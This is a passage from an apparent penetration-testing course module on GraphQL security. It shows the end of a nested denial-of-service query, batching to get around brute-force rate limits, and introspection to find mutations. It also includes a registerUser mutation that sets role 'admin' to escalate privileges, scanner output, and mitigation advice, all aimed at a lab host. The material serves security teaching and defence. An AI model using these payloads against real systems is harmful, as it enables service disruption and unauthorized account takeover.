+                                      posts {
+                                        edges {
+                                          node {
+                                            author {
+                                              posts {
+                                                edges {
+                                                  node {
+                                                    author {
+                                                      posts {
+                                                        edges {
+                                                          node {
+                                                            author {
+                                                              posts {
+                                                                edges {
+                                                                  node {
+                                                                    author {
+                                                                      username
+                                                                    }
+                                                                  }
+                                                                }
+                                                              }
+                                                            }
+                                                          }
+                                                        }
+                                                      }
+                                                    }
+                                                  }
+                                                }
+                                              }
+                                            }
+                                          }
+                                        }
+                                      }
+                                    }
+                                  }
+                                }
+                              }
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+</code></pre>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\dos_2.png" alt="Error page with message &quot;Aw, Snap! Something went wrong while displaying this webpage.&quot; Error code: 4. Options to learn more or reload."></p>
+<hr>
+<h3 id="batching-attacks">Batching Attacks</h3>
+<p>Batching in GraphQL refers to executing multiple queries with a single request. We can do so by directly supplying multiple queries in a JSON list in the HTTP request. For instance, we can query the ID of the user <code>admin</code> and the title of the first post in a single request:</p>
+<p>Code: http</p>
+<pre><code class="lang-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/graphql</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 172.17.0.2
+<span class="hljs-attribute">Content-Length</span>: 86
+<span class="hljs-attribute">Content-Type</span>: application/json
+
+<span class="json">[
+    {
+        <span class="hljs-attr">"query"</span>:<span class="hljs-string">"{user(username: \"admin\") {uuid}}"</span>
+    },
+    {
+        <span class="hljs-attr">"query"</span>:<span class="hljs-string">"{post(id: 1) {title}}"</span>
+    }
+]</span>
+</code></pre>
+<p>The response contains the requested information in the same structure we provided the query in:</p>
+<p><img src="storage\modules\271\batching_1.png" alt="GraphQL request and response. Request: two queries, one for user with username &quot;admin&quot; to get uuid, another for post with id 1 to get title. Response: user uuid &quot;3&quot;, post title &quot;Lorem ipsum 1&quot;."></p>
+<p>Batching is not a security vulnerability but an intended feature that can be enabled or disabled. However, batching can lead to security issues if GraphQL queries are used for sensitive processes such as user login. Since batching enables an attacker to provide multiple GraphQL queries in a single request, it can potentially be used to conduct brute-force attacks with significantly fewer HTTP requests. This could lead to bypasses of security measures in place to prevent brute-force attacks, such as rate limits.</p>
+<p>For instance, assume a web application uses GraphQL queries for user login. The GraphQL endpoint is protected by a rate limit, allowing only five requests per second. An attacker can brute-force user accounts with only five passwords per second. However, using GraphQL batching, an attacker can put multiple login queries into a single HTTP request. Assuming the attacker constructs an HTTP request containing 1000 different GraphQL login queries, the attacker can now brute-force user accounts with up to 5000 passwords per second, rendering the rate limit ineffective. Thus, GraphQL batching can enable powerful brute-force attacks.</p>
+<hr>
+<h2 id="mutations">Mutations</h2>
+<hr>
+<p>In the <code>Introduction to GraphQL</code> section, we discussed various basic elements of GraphQL queries. However, you might have noticed that we only discussed ways to read data. Just like REST APIs, GraphQL provides a way to modify data as well. This is done through the use of <code>mutations</code>.</p>
+<hr>
+<h3 id="what-are-mutations-">What are mutations?</h3>
+<p>Mutations are GraphQL queries that modify server data. They can be used to create new objects, update existing objects, or delete existing objects.</p>
+<p>Let us start by identifying all mutations supported by the backend and their arguments. We will use the following introspection query:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">query {
+  __schema {
+    mutationType {
+      <span class="hljs-keyword">name</span>
+      fields {
+        <span class="hljs-keyword">name</span>
+        args {
+          <span class="hljs-keyword">name</span>
+          defaultValue
+          <span class="hljs-keyword">type</span> {
+            ...TypeRef
+          }
+        }
+      }
+    }
+  }
+}
+
+fragment TypeRef on __Type {
+  <span class="hljs-keyword">kind</span>
+  <span class="hljs-keyword">name</span>
+  ofType {
+    <span class="hljs-keyword">kind</span>
+    <span class="hljs-keyword">name</span>
+    ofType {
+      <span class="hljs-keyword">kind</span>
+      <span class="hljs-keyword">name</span>
+      ofType {
+        <span class="hljs-keyword">kind</span>
+        <span class="hljs-keyword">name</span>
+        ofType {
+          <span class="hljs-keyword">kind</span>
+          <span class="hljs-keyword">name</span>
+          ofType {
+            <span class="hljs-keyword">kind</span>
+            <span class="hljs-keyword">name</span>
+            ofType {
+              <span class="hljs-keyword">kind</span>
+              <span class="hljs-keyword">name</span>
+              ofType {
+                <span class="hljs-keyword">kind</span>
+                <span class="hljs-keyword">name</span>
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+</code></pre>
+<p>From the result, we can identify a mutation <code>registerUser</code>, presumably allowing us to create new users. The mutation requires a <code>RegisterUserInput</code> object as an input:</p>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\mutation_1.png" alt="GraphiQL interface showing a query and response. Query: retrieves schema mutation type fields and arguments. Response: mutation type &quot;Mutation&quot; with field &quot;registerUser&quot;, argument &quot;input&quot; of type &quot;RegisterUserInput&quot;."></p>
+<p>We can now query all fields of the <code>RegisterUserInput</code> object with the following introspection query to obtain all fields that we can use in the mutation:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{   
+  __type(<span class="hljs-name">name:</span> <span class="hljs-string">"RegisterUserInput"</span>) {
+    name
+    inputFields {
+      name
+      description
+      defaultValue
+    }
+  }
+}
+</code></pre>
+<p>From the result, we can identify that we can provide the new user's <code>username</code>, <code>password</code>, <code>role</code>, and <code>msg</code>:</p>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\mutation_2.png" alt="GraphiQL interface showing a query and response. Query: retrieves type &quot;RegisterUserInput&quot; with input fields. Response: fields include &quot;username&quot;, &quot;password&quot;, &quot;role&quot;, and &quot;msg&quot;, all with null descriptions and default values."></p>
+<p>As we identified earlier, we need to provide the password as an MD5-hash. To hash our password, we can use the following command:</p>
+<p>  Mutations</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ echo -n <span class="hljs-string">'password'</span> | md5sum
+
+<span class="hljs-number">5</span>f4dcc3b5aa765d61d8327deb882cf99  -
+</code></pre>
+<p>With the hashed password, we can now finally register a new user by running the mutation:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">mutation {
+  registerUser(input: {username: <span class="hljs-string">"vautia"</span>, password: <span class="hljs-string">"5f4dcc3b5aa765d61d8327deb882cf99"</span>, role: <span class="hljs-string">"user"</span>, msg: <span class="hljs-string">"newUser"</span>}) {
+    <span class="hljs-keyword">user</span> <span class="hljs-title">{
+      username</span>
+      password
+      msg
+      <span class="hljs-keyword">role</span>
+    <span class="hljs-title">}
+  }
+}</span>
+</code></pre>
+<p>The result contains the fields we queried in the mutation's body so that we can check for errors:</p>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\mutation_3.png" alt="GraphiQL interface showing a mutation and response. Mutation: registerUser with input username &quot;vautia&quot; and password. Response: user data includes username &quot;vautia&quot;, password, message &quot;newUser&quot;, and role &quot;user&quot;."></p>
+<p>We can now successfully log in to the application with our newly registered user.</p>
+<hr>
+<h3 id="exploitation-with-mutations">Exploitation with Mutations</h3>
+<p>To identify potential attack vectors through mutations, we need to thoroughly examine all supported mutations and their inputs. In this case, we can provide the <code>role</code> argument for newly registered users, which might enable us to create users with a different role than the default role, potentially allowing us to escalate privileges.</p>
+<p>We have identified the roles <code>user</code> and <code>admin</code> from querying all existing users. Let us create a new user with the role <code>admin</code> and check if this enables us to access the internal admin endpoint at <code>/admin</code>. We can use the following GraphQL mutation:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">mutation {
+  registerUser(input: {username: <span class="hljs-string">"vautiaAdmin"</span>, password: <span class="hljs-string">"5f4dcc3b5aa765d61d8327deb882cf99"</span>, role: <span class="hljs-string">"admin"</span>, msg: <span class="hljs-string">"Hacked!"</span>}) {
+    <span class="hljs-keyword">user</span> <span class="hljs-title">{
+      username</span>
+      password
+      msg
+      <span class="hljs-keyword">role</span>
+    <span class="hljs-title">}
+  }
+}</span>
+</code></pre>
+<p>In the result, we can see that the role <code>admin</code> is reflected, which indicates that the attack was successful:</p>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\mutation_4.png" alt="GraphiQL interface showing a mutation and response. Mutation: registerUser with input username &quot;vautiaAdmin&quot; and password. Response: user data includes username &quot;vautiaAdmin&quot;, password, message &quot;Hacked!&quot;, and role &quot;admin&quot;."></p>
+<p>After logging in, we can now access the admin endpoint, meaning we have successfully escalated our privileges:</p>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\mutation_5.png" alt="Webpage displaying &quot;This is the admin area!&quot; with navigation links: Home, Profile, Admin Area, Logout. Social media icons for YouTube, Facebook, Twitter, GitHub. Footer with &quot;© 2024 Copyright&quot;."></p>
+<hr>
+<h2 id="tools-of-the-trade">Tools of the Trade</h2>
+<hr>
+<p>We have already discussed tools that can help us in the enumeration phase: <a href="https://github.com/dolevf/graphw00f">graphw00f</a> and <a href="https://github.com/graphql-kit/graphql-voyager">graphql-voyager</a>. We will now discuss further tools to help us attack GraphQL APIs.</p>
+<hr>
+<h3 id="graphql-cop">GraphQL-Cop</h3>
+<p>We can use the tool <a href="https://github.com/dolevf/graphql-cop">GraphQL-Cop</a>, a security audit tool for GraphQL APIs. After cloning the GitHub repository and installing the required dependencies, we can run the <code>graphql-cop.py</code> Python script:</p>
+<p>  Tools of the Trade</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">python3</span> graphql-cop.<span class="hljs-keyword">py</span>  -v
+
+<span class="hljs-keyword">version</span>: <span class="hljs-number">1.13</span>
+</code></pre>
+<p>We can then specify the GraphQL API's URL with the <code>-t</code> flag. GraphQL-Cop then executes multiple basic security configuration checks and lists all identified issues, which is a great baseline for further manual tests:</p>
+<p>  Tools of the Trade</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python3 graphql-cop/graphql-cop.py -t http:<span class="hljs-comment">//172.17.0.2/graphql</span>
+
+[HIGH] Alias Overloading - Alias Overloading <span class="hljs-keyword">with</span> <span class="hljs-number">100</span>+ aliases <span class="hljs-keyword">is</span> allowed (Denial <span class="hljs-keyword">of</span> Service - /graphql)
+[HIGH] <span class="hljs-keyword">Array</span>-based Query Batching - Batch queries allowed <span class="hljs-keyword">with</span> <span class="hljs-number">10</span>+ simultaneous queries (Denial <span class="hljs-keyword">of</span> Service - /graphql)
+[HIGH] Directive Overloading - Multiple duplicated directives allowed <span class="hljs-keyword">in</span> a query (Denial <span class="hljs-keyword">of</span> Service - /graphql)
+[HIGH] Field Duplication - Queries are allowed <span class="hljs-keyword">with</span> <span class="hljs-number">500</span> <span class="hljs-keyword">of</span> the same repeated field (Denial <span class="hljs-keyword">of</span> Service - /graphql)
+[LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql)
+[MEDIUM] GET <span class="hljs-function"><span class="hljs-keyword">Method</span> <span class="hljs-title">Query</span> <span class="hljs-title">Support</span> - <span class="hljs-title">GraphQL</span> <span class="hljs-title">queries</span> <span class="hljs-title">allowed</span> <span class="hljs-title">using</span> <span class="hljs-title">the</span> <span class="hljs-title">GET</span> <span class="hljs-title">method</span> <span class="hljs-params">(Possible Cross Site Request Forgery (CSRF)</span> - /<span class="hljs-title">graphql</span>)
+[<span class="hljs-title">LOW</span>] <span class="hljs-title">GraphQL</span> <span class="hljs-title">IDE</span> - <span class="hljs-title">GraphiQL</span> <span class="hljs-title">Explorer</span>/<span class="hljs-title">Playground</span> <span class="hljs-title">Enabled</span> <span class="hljs-params">(Information Leakage - /graphql)</span>
+[<span class="hljs-title">HIGH</span>] <span class="hljs-title">Introspection</span> - <span class="hljs-title">Introspection</span> <span class="hljs-title">Query</span> <span class="hljs-title">Enabled</span> <span class="hljs-params">(Information Leakage - /graphql)</span>
+[<span class="hljs-title">MEDIUM</span>] <span class="hljs-title">POST</span> <span class="hljs-title">based</span> <span class="hljs-title">url</span>-<span class="hljs-title">encoded</span> <span class="hljs-title">query</span> <span class="hljs-params">(possible CSRF)</span> - <span class="hljs-title">GraphQL</span> <span class="hljs-title">accepts</span> <span class="hljs-title">non</span>-<span class="hljs-title">JSON</span> <span class="hljs-title">queries</span> <span class="hljs-title">over</span> <span class="hljs-title">POST</span> <span class="hljs-params">(Possible Cross Site Request Forgery - /graphql)</span></span>
+</code></pre>
+<hr>
+<h3 id="inql">InQL</h3>
+<p><a href="https://github.com/doyensec/inql">InQL</a> is a Burp extension we can install via the <code>BApp Store</code> in Burp. After a successful installation, an <code>InQL</code> tab is added in Burp.</p>
+<p>Furthermore, the extension adds <code>GraphQL</code> tabs in the Proxy History and Burp Repeater that enable simple modification of the GraphQL query without having to deal with the encompassing JSON syntax:</p>
+<p><img src="storage\modules\271\inql_1.png" alt="GraphQL request and response. Request: query for users' uuid and username. Response: HTTP 200 OK, returns user with uuid &quot;1&quot; and username &quot;htb-stdnt&quot;."></p>
+<p>Furthermore, we can right-click on a GraphQL request and select <code>Extensions &gt; InQL - GraphQL Scanner &gt; Generate queries with InQL Scanner</code>:</p>
+<p><img src="storage\modules\271\inql_2.png" alt="GraphQL request and response with menu options. Request: POST to /graphql. Menu: Extensions > InQL - GraphQL Scanner with options to generate queries, batch attack, or open in GraphiQL. Response: HTTP 200 OK, returns user with uuid &quot;1&quot; and username &quot;htb-stdnt&quot;."></p>
+<p>Afterward, InQL generates introspection information. The information regarding all mutations and queries is provided in the <code>InQL</code> tab for the scanned host:</p>
+<p><img src="storage\modules\271\inql_3.png" alt="InQL interface showing a file tree and GraphQL query. File tree includes mutations and queries like posts.graphql. Query retrieves posts with author details, authorId, body, category, id, title, and uuid."></p>
+<p>This is only a basic overview of InQL's functionality. Check out the official <a href="https://github.com/portswigger/inql">GitHub repository</a> for more details.</p>
+<hr>
+<h2 id="graphql-vulnerability-prevention">GraphQL Vulnerability Prevention</h2>
+<hr>
+<p>After discussing how to attack different vulnerabilities that arise from misconfigured GraphQL implementations, let's discuss mitigations to prevent these vulnerabilities.</p>
+<hr>
+<h3 id="vulnerability-prevention">Vulnerability Prevention</h3>
+<h4 id="information-disclosure">Information Disclosure</h4>
+<p>General security best practices apply to prevent information disclosure vulnerabilities. These include preventing verbose error messages and instead displaying generic error messages. Furthermore, introspection queries are potent tools for obtaining information. As such, they should be disabled if possible. At the very least, whether any sensitive information is disclosed in introspection queries should be checked. If this is the case, all sensitive information needs to be removed.</p>
+<h4 id="injection-attacks">Injection Attacks</h4>
+<p>Proper input validation checks need to be implemented to prevent any injection-type attacks such as SQL injection, command injection, or XSS. Any data the user supplies should be treated as untrusted before appropriate sanitization. The use of allowlists should be preferred over denylists.</p>
+<h4 id="denial-of-service-dos-">Denial-of-Service (DoS)</h4>
+<p>As discussed, DoS attacks and the amplification of brute-force attacks through batching are common GraphQL attack vectors. Proper limits need to be implemented to mitigate these types of attacks. This can include limits to the GraphQL query depth, limits to the maximum GraphQL query size, and rate limits on the GraphQL endpoint to prevent many subsequent queries in quick succession. Additionally, batching should be turned off in GraphQL queries if possible. If batching is required, the query depth needs to be limited.</p>
+<h4 id="api-design">API Design</h4>
+<p>General API security best practices should be followed to prevent further attacks, such as attacks against improper access control (for instance, IDOR) or attacks resulting from improper authorization checks on mutations. This includes strict access control measures according to the principle of least privileges. In particular, the GraphQL endpoint should only be accessible after successful authentication, if possible, according to the API's use case. Furthermore, authorization checks must be implemented; preventing actors from executing queries or mutations they are not authorized to.</p>
+<p>For more details on securing GraphQL APIs, check out OWASP's <a href="https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html">GraphQL Cheat Sheet</a>.</p>
+<hr>
+</div></body></html>
